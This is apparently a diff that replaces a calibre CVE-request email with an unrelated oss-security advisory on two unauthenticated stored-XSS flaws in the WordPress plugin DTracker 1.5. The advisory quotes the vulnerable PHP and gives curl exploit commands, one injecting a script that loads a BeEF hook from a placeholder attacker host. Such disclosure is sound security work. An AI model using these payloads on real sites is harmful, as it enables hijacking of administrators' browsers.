@@ -1,27 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/29/8
-Message-ID: <20170129163444.GA1097@donald>
-Date: Sun, 29 Jan 2017 17:34:44 +0100
-From: Martin Pitt <mpitt@...ian.org>
-To: oss-security@...ts.openwall.com
-Cc: Kovid Goyal <kovid@...idgoyal.net>, Antoine Beaupré <anarcat@...ian.org>
-Subject: Requesting CVE for calibre file disclosure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/13/28
+Message-id: <21EB3BEF-79F8-4316-A1A4-87ED0A39A3E5@me.com>
+Date: Mon, 13 Mar 2017 16:01:57 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
 Content-Type: text/plain; charset=utf-8
 
-Hello all,
+Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-08
+CVE-ID:[CVE-2017-1002006][CVE-2017-1002007]
+Download Site: https://wordpress.org/plugins/dtracker/
+Vendor: https://profiles.wordpress.org/dijo/
+Vendor Notified: 2017-03-09
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=186
+Description: Track the details of the users downloading the pdf files from wordpress site.
 
-Calibre 2.75 fixed what looks like a local data disclosure vulnerability:
+Vulnerability:
+CVE-2017-1002006,
+In file dtracker/save_contact.php
 
-  https://github.com/kovidgoyal/calibre/commit/3a89718664cb8c
+Doesn't check that the user is authorized before injecting new contacts into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
 
-@Kovid: Would you mind making the original Launchpad bug
-https://launchpad.net/bugs/1651728 public?
+$name 		= $_POST['name'];
+	$company	= $_POST['company'];
+	$phone 		= $_POST['phone'];
+	$country	= $_POST['country'];
+	$contact_id = $_POST['contact_id'];
+	
+	$table 	= 'wp_contacts';
+	$data	= array(
+				'name'		=> $name,
+				'company'	=> $company,
+				'phone'		=> $phone,
+				'country'	=> $country,
+			);
+	$where	= array(
+				'id'	=> $contact_id
+			);
+	
+$wpdb->flush();
+	
+$wpdb->update( $table, $data, $where ); //Update the Contact
 
-@osssec: Can you please assign a CVE on this one?
+CVE-2017-1002007,
+In file dtracker/save_mail.php
 
-Thanks to Antoine for pointing this out, this deserves an update in stable
-distro releases.
+Doesn't check that the user is authorized before injecting new emails into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  
 
-Martin
 
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+$email 	= $_POST['email'];
+	$time	= date('Y-m-d H:i:s');
+	$ip		= $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor
+	
+	$table 	= "wp_contacts";
+	$data	= array (
+				'email' 	=> $email,
+				'time'		=> $time,
+				'ip'		=> $ip	
+			);
+	
+	$wpdb->insert( $table, $data); //Insert Values
+	$contact_id = $wpdb->insert_id; //Get ID of the last inserted row
+	$data['contactId'] = $contact_id;
+	echo json_encode($data); //Pass the id to the JS
+
+Exploit Code:
+	• $ curl --data "email=\"><script>alert(1);</script>" http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
+	• {"email":"\\\"><script>alert(1);<\/script>","time":"2017-03-09 00:54:06","ip":"example.com","contactId":10577}
+	•  
+	• Or better yet, inject a BeEF hook.
+	•  
+	• $ curl --data 'email="><script src=http://BeEF_Host:3000/hook.js></script>' http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
